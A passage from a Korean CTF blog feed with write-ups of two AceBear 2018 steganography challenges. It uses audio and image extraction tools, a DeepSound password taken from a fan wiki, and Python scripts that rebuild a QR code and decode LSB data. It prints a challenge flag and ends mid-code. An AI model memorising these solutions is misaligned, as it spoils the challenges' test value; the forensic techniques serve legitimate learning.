+&lt;p&gt;audio/x-monkeys-audio 형식의 audio 파일이며, 재생이 가능하다. 재생을 해서, 들리는 소리를 들어보면 독백의 대사를 읊는 남자의 목소리를 확인할 수 있는데, 중간에 앨리엇이라는 단어를 듣고 예전에 봤던, &lt;code class=&quot;highlighter-rouge&quot;&gt;Mr.Robot&lt;/code&gt;이라는 미드에 나오는 대사 부분임을 알 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;일단, 문제로 주어진 binary가 audio 파일이기 떄문에, 생각해볼 수 있는 접근 방식은 morse, spectrum, steganography, funky file format 정도로 세웠다. morese는 특별한 연관 내용이 보이지 않아 넘겼고, spectrum을 확인했을 때, 아래와 같이 특별히 식별되는 정보는 보이지 않았다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/spectrum.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] check spectrum&lt;/p&gt;
+
+&lt;p&gt;내부적으로 딱히, file format을 가지고 장난을 친 흔적도 안보이고, 엔트로피 확인했을 때, 튀는 구간도 보이지 않게 분포가 일정했다. MP3 openStego를 이용해, hiding 된 Text가 있는지 살펴보았으나 마찬가지로 유의미한 정보는 없었으며 audio와 관련된 Steganography 에 대해 좀 더 찾아볼 필요가 있었다.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-Bash&quot;&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/My idol
+ binwalk ./call_him.ape
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/entrophy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] check entropy&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Users\jsh05042\Desktop\MP3Stego_1_1_18\MP3Stego&amp;gt;Decode.exe ./call_him.ape -X
+MP3StegoEncoder 1.1.17
+See README file for copyright info
+Input file = './call_him.ape'  output file = './call_him.ape.pcm'
+Will attempt to extract hidden information. Output: ./call_him.ape.txt
+Enter a passphrase:
+Confirm your passphrase: ******
+Enter a passphrase: **********
+Confirm your passphrase: **********
+the bit stream file ./call_him.ape is a BINARY file
+HDR: s=FFF, id=0, l=3, ep=off, br=B, sf=0, pd=1, pr=1, m=2, js=3, c=0, o=0, e=0
+alg.=MPEG-2 LSF, layer=III, tot bitrate=112, sfrq=22.1
+mode=dual-ch, sblim=32, jsbd=32, ch=2
+[Frame    0]Not enough main data to decode frame 0.  Frame discarded.
+[Frame    1]Got 24048 bits = 751 slots plus 16
+[Frame    2]Got 5336 bits = 166 slots plus 24
+[Frame    3]Got 8568 bits = 267 slots plus 24
+[Frame    4]Side info bad: block_type == 0 in split block.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Forensic wiki 에서 audio steganography 항목에 대해서 추가적으로 찾아보다, 아래와 같이 &lt;code class=&quot;highlighter-rouge&quot;&gt;deepsound&lt;/code&gt; 라는 항목에 대해 확인할 수 있었다. Audio 에 데이터를 숨기고, 이를 추출할 수 있는 Windows 용 Steganography 도구라고 명시되어 있는데 해당 도구를 찾아 이용해 보았다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] Forensic wiki - deepsound&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;deepsound&lt;/code&gt;를 설치하고, &lt;code class=&quot;highlighter-rouge&quot;&gt;call_him.ape&lt;/code&gt; 파일을 로드하니, 아래와 같이 password 요구 화면을 확인할 수 있었다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] deepsound&lt;/p&gt;
+
+&lt;p&gt;Password 에 대해 고민하던 찰나, 풀이자가 워낙 적었는지 hint 로 주어진 항목에, “Can u find his wikia?”라는 문장이 있었고 Elliot의 wiki를 찾아볼 수 있었다. http://mrrobot.wikia.com/wiki/Elliot 에서 내용을 볼 수 있으며, password로 쓰일만한 단서가 무엇인가 찾아보던 중 전화번호를 하나 확인할 수 있었다. &lt;code class=&quot;highlighter-rouge&quot;&gt;(212) 555-0179&lt;/code&gt; –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;2125550179&lt;/code&gt;로 password를 주었을 때, deepsound 로부터 hide data 를 식별할 수 있었다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound4.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] deepsound - hide data &amp;amp; extract data&lt;/p&gt;
+
+&lt;p&gt;좀 문제가 풀리는가 했는데, 여기서 또 한번 난관을 맞았다.. extract 한 파일의 data 가 도통 뭔지 식별할 수가 없는 문제였다. 이쯤 되면, Forensic 문제로 치부하기엔 Steganography 하나만 인정 해줄수 있을 것 같다… 아래는 해당 decode extract file. 숫자가 나오는 구간, alphabet이 나오는 구간 이렇게 구분지어지는 것은 확인했으나 무슨 의미를 가지는지 전혀 감을 못잡던 찰나, 주최측에서 새로운 힌트를 게시해뒀더라..
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/extractfile.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/hint.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] hint &amp;amp; file data&lt;/p&gt;
+
+&lt;p&gt;Base64가 아니며, Image file임을 알 수 있고, length, width를 잘 확인하고, charset, Black &amp;amp; White가 주어져있다. hint를 보고난 뒤, File size를 보니 48620 bytes 이다. “220x220”, “221x221”을 했을 때, 48400 size가 나오는데, 해당 파일 크기와 상당히 유사한 값을 띄는 것을 확인하고는 가로 세로 길이가 220인 Image를 base 로 접근했다.&lt;/p&gt;
+
+&lt;p&gt;이어서, 위 &lt;code class=&quot;highlighter-rouge&quot;&gt;weird&lt;/code&gt; 파일 data를 보면, 숫자 구간과 alphabet 구간으로 구분지어진 것을 확인할 수 있는데, &lt;code class=&quot;highlighter-rouge&quot;&gt;Black &amp;amp; White&lt;/code&gt;라는 hint 가 주어졌으므로 offset data 가 숫자일 경우, 알파벳일 경우를 나눠 Black과 White 의 색을 표현하는 code를 짜보았다.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'RGB'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;black&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;weird&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0123456789'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+            &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./result.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;몇번 시행착오 겪다가, 올바르게 뽑아낸 결과 파일을 확인해 보면, QR Code 임을 알 수 있으며 아래와 같다.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/My idol
+ python my.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/qr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] result - convert file&lt;/p&gt;
+
+&lt;p&gt;qr Code 가 나오는데, 색을 굳이 반전 시키지 않아도 정상인식이 가능하다. 인식을 Mobile app으로 진행했으며, 결과 Flag를 확인할 수 있다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/flag.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] QR - decode with mobile app&lt;/p&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;AceBear{2512_Ng0\`i_nh4\`_r4_d3\`!!!!k0_c00l}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_acebear" /><category term="Forensic" /><category term="MISC" /><category term="Writeup" /><category term="deepsound" /><summary type="html">Exercise Challenge Description: Trying to listen and maybe you know his name, and you’ll know one of his secret weapons . Something that he deleted from Michael Hansen may help you get in. Download: Link Author: komang4130</summary></entry><entry><title type="html">[2018_AceBear_CTF] STEg Challenge(996)</title><link href="http://localhost:4000/ctf/AceBear-CTF-STEg-Challenge-996/" rel="alternate" type="text/html" title="[2018_AceBear_CTF] STEg Challenge(996)" /><published>2018-02-09T00:00:00+09:00</published><updated>2018-02-09T00:00:00+09:00</updated><id>http://localhost:4000/ctf/AceBear-CTF-STEg-Challenge-996</id><content type="html" xml:base="http://localhost:4000/ctf/AceBear-CTF-STEg-Challenge-996/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Download: Link
+Service: nc 35.200.176.244 33338
+author: komang4130&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] exercise&lt;/i&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;AceBear CTF 에서 나왔던 Forensic/MISC 분야 중, 마지막 풀이 문제. JS 문제랑 마찬가지로 대회 당시에는 해결하지 못했다. 문제 제목에 대해서 조금만 더 고찰을 했었더라면 해결할 수 있었을텐데…&lt;/p&gt;
+
+&lt;p&gt;link를 통해, 받은 rar 파일을 압축 해제하면, &lt;code class=&quot;highlighter-rouge&quot;&gt;flag_enc.png&lt;/code&gt; 파일을 하나 확인할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/flag_enc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] flag_enc.png&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;이미지를 자세히 보면, 좌측 상단에 검정색 pixel 일부를 볼 수 있다. 당연히, pixel을 이용한 steganography 방식의 LSB 로 인식하고 접근했었는데 별짓을 다해도 의미있는 문자열을 확인할 수 없었던게 큰 문제였던 것 같다.&lt;/p&gt;
+
+&lt;p&gt;문제를 보면, nc 로 socket 접속할 수 있는 server 가 하나 주어지는데, 접속해보면 아래와 같이 16byte의 data를 받아 base64로  encode 된 data를 receive할 수 있었다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/data_recieve.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] encode data&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;decode 하여, 확인해보면 flag_enc와 동일한 이미지인 것을 확인할 수 있는데, 자세히 보면 상단의 pixel 위치가 조금씩 다르다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/file1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] decode data&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;여기서 생각의 전환이 조금 필요했다. server로 부터 어떤 유의미한 데이터를 얻어낼 수 있는가 고민을 하다가 결국, 원점으로 돌아가 flag_enc 로부터 정보를 얻어내려 했던 것이 발목을 잡았다..&lt;/p&gt;
+
+&lt;p&gt;결과적으로, 문제 제목에서 알 수 있듯이 &lt;code class=&quot;highlighter-rouge&quot;&gt;STEg&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;flag_enc&lt;/code&gt; 라는 문자열에 주목해보자. enc라는 문자열은 무엇인가 encrypt 되었다는 것을 의미한다. 그렇다면, 어떤 로직을 통해 data가 encrypt 되었다는 것인데 pixel과 Image를 Steganography 적용하는 방식에서 사용될 수 있는 항목은 주로 lsb일 것이다.&lt;/p&gt;
+
+&lt;p&gt;기존에 알고 있던 lsb 방식은 모두 이용해 보았지만 별 소득은 없었고, 구글을 뒤지다가 Python 과 관련된 도구에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Stepic&lt;/code&gt;라는 것을 찾을 수 있었다. (Python Steganography 라는 언급만 있었어도…ㅂㄷㅂㄷ)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/stepic.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] stepic stegano&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;연속된 3개의 pixel 에 data를 은닉하는 방식의 lsb 인데, code 그대로 사용해 unhide 할 수 있다. (https://stackoverflow.com/questions/16838341/steganography-in-python-stepic)&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decode_imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Given a sequence of pixels, returns an iterator of characters
+    encoded in the image'''&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;iter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
